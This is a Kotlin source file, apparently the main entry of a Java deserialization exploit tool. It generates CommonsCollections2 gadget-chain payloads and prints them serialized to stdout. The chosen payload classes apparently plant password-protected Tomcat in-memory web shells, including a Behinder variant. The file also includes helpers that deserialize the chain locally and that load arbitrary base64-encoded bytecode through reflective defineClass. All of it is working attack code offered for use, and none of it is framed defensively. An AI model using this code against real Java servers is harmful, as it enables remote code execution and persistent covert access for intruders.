package com.xhstormr.app

import com.github.ajalt.clikt.core.CliktCommand
import com.github.ajalt.clikt.parameters.options.option
import com.github.ajalt.clikt.parameters.options.required
import com.github.ajalt.clikt.parameters.types.enum
import java.io.ByteArrayInputStream
import java.io.ObjectInputStream
import java.util.Base64

object App : CliktCommand(printHelpOnEmptyArgs = true) {

    private val payload by option(help = "Password: xhstormr").enum<Payload>().required()

    override fun run() {
        // exploit(CommonsCollections2ObjectPayload, clazz<TomcatShellFilterTemplatesImpl>())
        // exploit(CommonsCollections2ObjectPayload, clazz<TomcatBehinderFilterTemplatesImpl>())

        CommonsCollections2ObjectPayload
            .getObject(payload.clazz)
            .serialize(System.out)
    }
}

fun main(args: Array<String>) = App.main(args)

fun exploit(payload: ObjectPayload, clazz: Class<*>) {
    try {
        val any = payload.getObject(clazz)
        println(any)
        ObjectInputStream(ByteArrayInputStream(any.serialize()))
            .readObject()
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

fun exploit(base64: String) {
    val bytes = ungzip(Base64.getDecoder().decode(base64))
    val method = clazz<ClassLoader>().getDeclaredMethod(
        "defineClass", clazz<ByteArray>(), Int::class.javaPrimitiveType, Int::class.javaPrimitiveType
    ).apply { isAccessible = true }
    val clazz = method.invoke(object : ClassLoader() {}, bytes, 0, bytes.size) as Class<*>
    println(clazz)
    clazz.newInstance() == "123"
}
